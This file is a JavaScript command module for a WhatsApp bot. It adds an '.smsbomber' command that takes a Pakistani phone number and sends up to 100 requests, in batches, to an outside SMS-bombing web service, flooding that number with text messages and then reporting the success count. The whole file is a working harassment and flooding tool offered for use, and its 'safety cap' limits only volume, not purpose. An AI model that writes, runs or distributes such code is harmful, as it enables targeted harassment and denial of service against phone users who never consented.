const axios = require('axios');

module.exports = {
    command: 'smsbomber',
    aliases: ['bomb', 'smspanic'],
    category: 'tools',
    description: 'Send multiple SMS to a Pakistani number (use with caution)',
    usage: '.smsbomber 923001234567 [count] (default 50, max 100)',
    async handler(sock, message, args, context) {
        const chatId = context.chatId || message.key.remoteJid;
        const number = args[0];
        let count = parseInt(args[1]) || 50;
        if (count > 100) count = 100; // safety cap
        if (!number || !number.startsWith('92') || number.length < 11) {
            return await sock.sendMessage(chatId, { 
                text: '❌ Please provide a valid Pakistani number starting with 92.\nExample: .smsbomber 923001234567 50' 
            }, { quoted: message });
        }

        await sock.sendMessage(chatId, { text: `⏳ Sending ${count} SMS bombs...` }, { quoted: message });

        const api = `https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php?number=${number}`;
        let successCount = 0;
        let failCount = 0;

        // Send requests in batches of 10 to balance speed and reliability
        const batchSize = 10;
        for (let i = 0; i < count; i += batchSize) {
            const batch = [];
            for (let j = 0; j < batchSize && i + j < count; j++) {
                batch.push(axios.get(api, { timeout: 10000 }).catch(err => ({ error: err })));
            }
            const batchResults = await Promise.all(batch);
            for (const res of batchResults) {
                if (res.error) {
                    failCount++;
                } else if (res.data && res.data.status === 'success') {
                    successCount++;
                } else {
                    failCount++;
                }
            }
            // Small delay between batches to avoid hitting rate limits
            if (i + batchSize < count) await new Promise(resolve => setTimeout(resolve, 500));
        }

        const summary = `✅ SMS bombing completed!\n\n📱 Number: ${number}\n✅ Success: ${successCount}\n❌ Failed: ${failCount}\n📊 Total: ${count}`;
        await sock.sendMessage(chatId, { text: summary }, { quoted: message });
    }
};
